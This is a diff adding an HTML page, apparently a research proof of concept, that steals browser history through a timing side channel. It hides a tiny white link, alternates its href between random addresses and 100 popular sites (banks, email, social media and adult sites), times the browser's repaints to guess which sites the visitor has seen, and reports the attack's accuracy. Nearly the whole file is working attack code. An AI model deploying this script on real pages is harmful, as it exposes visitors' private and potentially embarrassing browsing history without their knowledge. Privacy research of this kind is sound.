@@ -1,0 +1,210 @@
+<html>
+	<head>
+		<style>
+			.attack {
+				font-size: 2px;
+				color: white;
+			}
+
+			.attack:visited  { color: #feffff; }
+		</style>
+	</head>
+	<body>
+		<table id="tbl-params">
+			<tr>
+				<td colspan="2" style="border-bottom: 1px dashed;text-align: center">
+					<b>Stealing Browser History Through Side Channels: Time - Method A</b>
+				</td>
+			</tr>
+			<tr>
+				<td>
+					Text Length: <input id="textLength" dir="rtl" size="1" value=256 onKeyUp=resizeText()></input>(K) Characters
+				</td>
+				<td>
+					<button id="run" onclick="init()">RUN</button>
+				</td>
+			</tr>
+		</table>
+
+		<a id="a0" class="attack"></a>
+
+		<div id="res"></div>
+		<div id="visited-div"></div>
+		<div id="unvisited-div"></div>
+
+		<script>
+			const num_of_attempts = 10;
+			const BASE_TEXT = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+			requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;
+			
+			var visited_urls = ["https://www.google.com/", "https://www.youtube.com/", "https://www.pornhub.com/", "https://www.facebook.com/", "https://www.reddit.com/", "https://www.amazon.com/", "https://twitter.com/", "https://www.xvideos.com/", "https://www.yahoo.com/", "https://www.wikipedia.org/", "https://weather.com/", "https://www.fandom.com/", "https://www.instagram.com/", "https://duckduckgo.com/", "https://www.walmart.com/", "https://www.xnxx.com/", "https://www.bing.com/", "https://www.tiktok.com/", "https://xhamster.com/", "https://www.ebay.com/", "https://www.cnn.com/", "https://onlyfans.com/", "https://www.taboola.com/", "https://www.usps.com/", "https://www.twitch.tv/", "https://www.quora.com/", "https://www.foxnews.com/", "https://www.espn.com/", "https://chaturbate.com/", "https://www.nytimes.com/", "https://www.tremendous.com/", "https://www.imdb.com/", "https://www.paypal.com/us/home", "https://outlook.live.com/owa/", "https://www.etsy.com/", "https://www.linkedin.com/feed/", "https://gamerant.com/", "https://www.netflix.com/", "https://www.office.com/", "https://simpcity.su/", "https://www.accuweather.com/", "https://www.ups.com/us/en/global.page", "https://www.microsoft.com/en-us/?ql=4", "https://discord.com/", "https://www.msn.com/", "https://www.pinterest.com/", "https://www.dailymail.co.uk/ushome/index.html", "https://www.blogger.com/about/?bpli=1", "https://www.apple.com/", "https://www.indeed.com/"];
+			var unvisited_urls = ["https://www.bestbuy.com/", "https://www.fedex.com/global/choose-location.html", "https://zoom.us/", "https://www.tumblr.com/", "https://www.target.com/", "https://stripchat.com/", "https://www.ign.com/" , "https://www.ign.com/", "https://nypost.com/", "https://www.patreon.com/", "https://www.zillow.com/", "https://www.gamespot.com/", "https://open.spotify.com/?", "https://www.samsung.com/us/", "https://www.livejasmin.com/en/girls/", "https://www.homedepot.com/", "https://www.roblox.com/", "https://www.erome.com/", "https://www.eporner.com/", "https://www.capitalone.com/", "https://github.com/", "https://www.marca.com/", "https://newyork.craigslist.org/", "https://www.hulu.com/welcome", "https://www.instructure.com/", "https://steamcommunity.com/", "https://www.xfinity.com/national/", "https://www.bbc.com/", "https://www.chase.com/", "https://gogoanime.gr/", "https://www.youporn.com/", "https://www.t-mobile.com/", "https://www.usatoday.com/", "https://wordpress.com/", "https://www.healthline.com/", "https://www.lowes.com/", "https://www.washingtonpost.com/", "https://www.adobe.com/", "https://quizlet.com/", "https://www.yelp.com/", "https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration?ms.officeurl=sharepoint&rtc=1", "https://www.att.com/", "https://aws.amazon.com/", "https://nextdoor.com/", "https://www.android.com/", "https://linktr.ee/", "https://www.macys.com/", "https://www.cnbc.com/", "http://microsoftonline.com/", "http://dood.re/"];
+			var urls = ["https://www.google.com/", "https://www.youtube.com/", "https://www.pornhub.com/", "https://www.facebook.com/", "https://www.reddit.com/", "https://www.amazon.com/", "https://twitter.com/", "https://www.xvideos.com/", "https://www.yahoo.com/", "https://www.wikipedia.org/", "https://weather.com/", "https://www.fandom.com/", "https://www.instagram.com/", "https://duckduckgo.com/", "https://www.walmart.com/", "https://www.xnxx.com/", "https://www.bing.com/", "https://www.tiktok.com/", "https://xhamster.com/", "https://www.ebay.com/", "https://www.cnn.com/", "https://onlyfans.com/", "https://www.taboola.com/", "https://www.usps.com/", "https://www.twitch.tv/", "https://www.quora.com/", "https://www.foxnews.com/", "https://www.espn.com/", "https://chaturbate.com/", "https://www.nytimes.com/", "https://www.tremendous.com/", "https://www.imdb.com/", "https://www.paypal.com/us/home", "https://outlook.live.com/owa/", "https://www.etsy.com/", "https://www.linkedin.com/feed/", "https://gamerant.com/", "https://www.netflix.com/", "https://www.office.com/", "https://simpcity.su/", "https://www.accuweather.com/", "https://www.ups.com/us/en/global.page", "https://www.microsoft.com/en-us/?ql=4", "https://discord.com/", "https://www.msn.com/", "https://www.pinterest.com/", "https://www.dailymail.co.uk/ushome/index.html", "https://www.blogger.com/about/?bpli=1", "https://www.apple.com/", "https://www.indeed.com/", "https://www.bestbuy.com/", "https://www.fedex.com/global/choose-location.html", "https://zoom.us/", "https://www.tumblr.com/", "https://www.target.com/", "https://stripchat.com/", "https://www.ign.com/", "https://www.ign.com/", "https://nypost.com/", "https://www.patreon.com/", "https://www.zillow.com/", "https://www.gamespot.com/", "https://open.spotify.com/?", "https://www.samsung.com/us/", "https://www.livejasmin.com/en/girls/", "https://www.homedepot.com/", "https://www.roblox.com/", "https://www.erome.com/", "https://www.eporner.com/", "https://www.capitalone.com/", "https://github.com/", "https://www.marca.com/", "https://newyork.craigslist.org/", "https://www.hulu.com/welcome", "https://www.instructure.com/", "https://steamcommunity.com/", "https://www.xfinity.com/national/", "https://www.bbc.com/", "https://www.chase.com/", "https://gogoanime.gr/", "https://www.youporn.com/", "https://www.t-mobile.com/", "https://www.usatoday.com/", "https://wordpress.com/", "https://www.healthline.com/", "https://www.lowes.com/", "https://www.washingtonpost.com/", "https://www.adobe.com/", "https://quizlet.com/", "https://www.yelp.com/", "https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration?ms.officeurl=sharepoint&rtc=1", "https://www.att.com/", "https://aws.amazon.com/", "https://nextdoor.com/", "https://www.android.com/", "https://linktr.ee/", "https://www.macys.com/", "https://www.cnbc.com/", "http://microsoftonline.com/", "http://dood.re/"];
+
+			var targetNode, paramsTable, phase, visited_flag, swap, attempt_number, url_index;
+			var med_visited, med_unvisited;
+			var time_base, time_calibrate, time_test;
+			var measurement_values = [], measure_sweeps = [];
+
+			function arbitraryLengthText(inputText, requestedLength) {
+				let outputString = inputText;
+				while (outputString.length < requestedLength) {
+					outputString += outputString;
+				}
+				return outputString.substring(0, requestedLength);
+			}
+
+			// https://stackoverflow.com/questions/2450954/how-to-randomize-shuffle-a-javascript-array
+			function shuffle(array) {
+				let currentIndex = array.length,  randomIndex;
+				while (currentIndex != 0) {
+					randomIndex = Math.floor(Math.random() * currentIndex);
+					currentIndex--;
+					[array[currentIndex], array[randomIndex]] = [
+					array[randomIndex], array[currentIndex]];
+				}
+				return array;
+			}
+
+			function median(arr) {
+
+				arr = arr.sort(function (a, b) { return a - b });
+		
+				var length = arr.length;
+		
+				if (length % 2 == 1) {
+					return arr[(length / 2) - .5]
+				}
+				else {	
+					return (arr[length / 2] + arr[(length / 2) - 1]) / 2;
+				}
+			}
+			
+			function resizeText() { document.getElementById('a0').innerText = arbitraryLengthText(BASE_TEXT, Math.pow(2,10)*parseInt(document.getElementById("textLength").value)); }
+
+			function init() {
+				document.getElementById("res").innerText = '';
+				document.getElementById("visited-div").innerHTML = '';
+				document.getElementById("unvisited-div").innerHTML = '';
+				resizeText(); shuffle(urls);
+				targetNode = document.getElementById('a0'); paramsTable = document.getElementById('tbl-params');
+				go_base();
+			}
+
+			function go_base() {
+				paramsTable.style.display = "none"; targetNode.style.display = 'block';
+				phase = "calibrate", swap = false, attempt_number = 0, visited_flag = true, measurement_values = [];
+				targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+				time_base = performance.now();
+				requestAnimationFrame(onAnimateBase);
+			}
+
+			function onAnimateBase() {
+				if(visited_flag && attempt_number == num_of_attempts) visited_flag = false;
+				if(attempt_number == (num_of_attempts*2)) {
+					measurement_values[attempt_number] = performance.now();
+					time_calibrate = (performance.now() - time_base).toFixed(3);
+					report_base();
+					return;
+				}
+				if(swap) {
+					swap = false;
+					targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+				} else {
+					swap = true;
+					if(visited_flag) {
+						targetNode.href = location.href; targetNode.style.color = 'white'; targetNode.style.color = '';
+					} else {
+						targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+					}
+					measurement_values[attempt_number] = performance.now(); attempt_number++;
+				}
+				requestAnimationFrame(onAnimateBase);
+			}
+			
+			function report_base() {
+				phase = "finished_calibrate!";
+				
+				measure_sweeps = [];
+				for(let i = 0; i < num_of_attempts; i++) {
+					measure_sweeps[i] = measurement_values[i+1] - measurement_values[i];
+				}
+				med_visited = median(measure_sweeps);
+				
+				measure_sweeps = [];
+				for(let i = num_of_attempts; i < (num_of_attempts*2); i++) {
+					measure_sweeps[i-num_of_attempts] = measurement_values[i+1] - measurement_values[i];
+				}
+				med_unvisited = median(measure_sweeps);
+				
+				go_test();
+			}
+
+			function go_test() {
+				paramsTable.style.display = "none"; targetNode.style.display = 'block';
+				phase = "test"; swap = false; url_index = 0; measurement_values = [];
+				targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+				time_base = performance.now();
+				requestAnimationFrame(onAnimateTest);
+			}
+
+			function onAnimateTest() {
+				if(url_index < 100) {
+					if(swap) {
+						swap = false;
+						targetNode.href = 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'; targetNode.style.color = 'white'; targetNode.style.color = '';
+					} else {
+						swap = true;
+						targetNode.href = urls[url_index]; targetNode.style.color = 'white'; targetNode.style.color = '';
+						measurement_values[url_index] = performance.now(); url_index++;
+					}
+					requestAnimationFrame(onAnimateTest);
+				} else {
+					measurement_values[url_index] = performance.now();
+					time_test = (performance.now() - time_base).toFixed(3);
+					report_test();
+					return;
+				}
+			}
+
+			
+			function report_test() {
+				phase = "finished!";
+				targetNode.style.display = 'none'; paramsTable.style.display = "inline";
+				document.getElementById("res").style.color = 'black'; document.getElementById("res").style.font = "10px";
+				document.getElementById("visited-div").innerHTML = '</br><b>Visited URLs:</b></br>';
+				document.getElementById("unvisited-div").innerHTML = '</br><b>Unvisited URLs:</b></br>';
+
+				let true_count_visited = 0, true_count_unvisited = 0;
+				let states = [], sweeps = [];
+				let curr_idx, curr_trace;
+				for(curr_idx = 0; curr_idx < 100; curr_idx++) {
+
+					curr_trace = measurement_values[curr_idx+1] - measurement_values[curr_idx];
+
+					if(Math.abs(curr_trace - med_visited) < Math.abs(curr_trace - med_unvisited)) {
+						document.getElementById("visited-div").innerHTML += '<a href=' + urls[curr_idx] + ' >' + urls[curr_idx] + '</a></br>';
+						if(visited_urls.indexOf(urls[curr_idx]) > -1) true_count_visited++;
+					} else {
+						document.getElementById("unvisited-div").innerHTML += '<a href=' + urls[curr_idx] + ' >' + urls[curr_idx] + '</a></br>';
+						if(unvisited_urls.indexOf(urls[curr_idx]) > -1) true_count_unvisited++;
+					}
+					states[curr_idx] = visited_urls.indexOf(urls[curr_idx]) > -1 ? 1 : 0;
+					sweeps[curr_idx] = curr_trace;
+				}
+				
+				let resultNode = document.getElementById("res");
+				resultNode.innerText += "\n Visited Median: " + med_visited.toFixed(3);
+				resultNode.innerText += "\n Unvisited Median: " + med_unvisited.toFixed(3);
+				resultNode.innerText += "\n Visited (TP): " + true_count_visited;
+				resultNode.innerText += "\n Unvisited (TN): " + true_count_unvisited;
+				//resultNode.innerText += "\n # of tested URLs: " + urls.length;
+				resultNode.innerText += "\n Attack Accuracy: " + (((true_count_visited + true_count_unvisited)/(visited_urls.length+unvisited_urls.length))*100).toFixed(0)+'%';
+				resultNode.innerText += "\n Calibration Time : " + (time_calibrate/1000).toFixed(3) + "s";
+				resultNode.innerText += "\n Test Time : " + (time_test/1000).toFixed(3) + "s";
+				//resultNode.innerText += "\n state: " + states;
+				//resultNode.innerText += "\n sweeps: " + sweeps;
+			}
+		</script>
+	</body>
+</html>
